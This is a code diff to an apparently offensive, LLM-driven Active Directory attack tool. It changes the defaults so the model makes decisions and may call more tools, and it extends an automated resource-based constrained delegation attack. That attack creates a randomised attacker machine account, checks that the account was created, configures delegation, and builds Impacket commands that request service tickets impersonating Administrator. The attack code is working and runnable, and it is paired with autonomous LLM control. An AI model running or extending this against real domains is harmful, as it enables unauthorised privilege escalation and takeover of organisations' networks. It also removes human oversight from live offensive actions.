@@ -94,12 +94,12 @@ AGENT_CLEAN_OUTPUT_ON_START = os.environ.get("AGENT_CLEAN_OUTPUT_ON_START", "tru
 AGENT_ARCHIVE_OLD_RUNS = os.environ.get("AGENT_ARCHIVE_OLD_RUNS", "true").lower() in ("1", "true", "yes", "on")
 AGENT_LIVE_COMMANDS = os.environ.get("ADSTRIKE_AGENT_LIVE_COMMANDS", "true").lower() in ("1", "true", "yes", "on")
 OLLAMA_API_TIMEOUT = int(os.environ.get("ADSTRIKE_OLLAMA_TIMEOUT", "60"))
-OLLAMA_MAX_TOOLS = max(1, int(os.environ.get("ADSTRIKE_OLLAMA_MAX_TOOLS", "1")))
+OLLAMA_MAX_TOOLS = max(1, int(os.environ.get("ADSTRIKE_OLLAMA_MAX_TOOLS", "3")))
 OLLAMA_SHOW_FALLBACK_WARNINGS = os.environ.get(
     "ADSTRIKE_OLLAMA_SHOW_FALLBACK_WARNINGS", "false"
 ).lower() in ("1", "true", "yes", "on")
 OLLAMA_FORCE_LLM_DECISION = os.environ.get(
-    "ADSTRIKE_OLLAMA_FORCE_LLM_DECISION", "false"
+    "ADSTRIKE_OLLAMA_FORCE_LLM_DECISION", "true"
 ).lower() in ("1", "true", "yes", "on")
 
 # ── OPSEC / Red Team settings ─────────────────────────────────────────────────
@@ -7322,8 +7322,25 @@ def tool_rbcd_attack(dc_ip: str, domain: str, username: str,
         return "RBCD skipped: target_computer required (computer with GenericWrite ACL on attacker's principal)"
 
     target_sam = target_computer.rstrip("$") + "$"
-    attacker_computer = "ADSTRIKE$"
-    attacker_pass = "AdStrike123!"
+    explicit_gmsa = {
+        str(x).strip().strip("'\"").lower().rstrip("$")
+        for x in (SESSION.get("agent_intel", {}) or {}).get("gmsa_candidates", []) or []
+    }
+    explicit_gmsa.update(
+        str(x).strip().strip("'\"").lower().rstrip("$")
+        for x in ((SESSION.get("agent_intel", {}) or {}).get("gmsa_hashes", {}) or {}).keys()
+    )
+    if target_sam.lower().rstrip("$") in explicit_gmsa:
+        return (f"RBCD skipped: {target_sam} is a known gMSA, not a computer host. "
+                "Use gmsa_takeover/gmsa_read instead.")
+
+    attacker_stem = f"ADS{secrets.token_hex(4).upper()}"
+    attacker_computer = f"{attacker_stem}$"
+    attacker_pass = (
+        f"AdS-{secrets.token_urlsafe(12)}1!"
+        .replace("'", "A")
+        .replace("\\", "B")
+    )
     dc_host_arg = f"-dc-host {shell_quote(dc_fqdn)} " if dc_fqdn else ""
     krb_env = f"KRB5CCNAME={shell_quote(ccache)} " if (krb and ccache) else ""
     if krb and ccache and SESSION.get("krb5_config"):
@@ -7345,6 +7362,19 @@ def tool_rbcd_attack(dc_ip: str, domain: str, username: str,
                    f"{shell_quote(f'{domain}/{username}:{pw}')}")
     out = _run(add_cmd, timeout=30)
     results.append(f"=== Step 1: Add attacker computer ===\n{out[:600]}")
+    add_failed = any(s in out.lower() for s in (
+        "error", "exception", "traceback", "access_denied", "constraint",
+        "insufficient", "already exists", "not found", "kdc_err", "failed",
+    ))
+    add_succeeded = any(s in out.lower() for s in (
+        "successfully added", "account created", "added machine account",
+    ))
+    if add_failed and not add_succeeded:
+        results.append(
+            "RBCD stopped: attacker computer account was not created, "
+            "so rbcd.py/getST would fail with a non-existent machine account."
+        )
+        return "\n\n".join(results)
 
     # Step 2: Set RBCD via bloodyAD or rbcd.py
     rbcd_py = _impacket_cmd("rbcd")
@@ -7371,7 +7401,7 @@ def tool_rbcd_attack(dc_ip: str, domain: str, username: str,
               f"-dc-ip {shell_quote(dc_ip)} {dc_host_arg}"
               f"-spn {shell_quote(spn)} "
               f"-impersonate Administrator "
-              f"{shell_quote(f'{domain}/{attacker_computer.rstrip('$')}:{attacker_pass}')}")
+              f"{shell_quote(f'{domain}/{attacker_computer}:{attacker_pass}')}")
     out3 = _run(st_cmd, timeout=30)
     results.append(f"=== Step 3: S4U2Proxy ===\n{out3[:800]}")
 
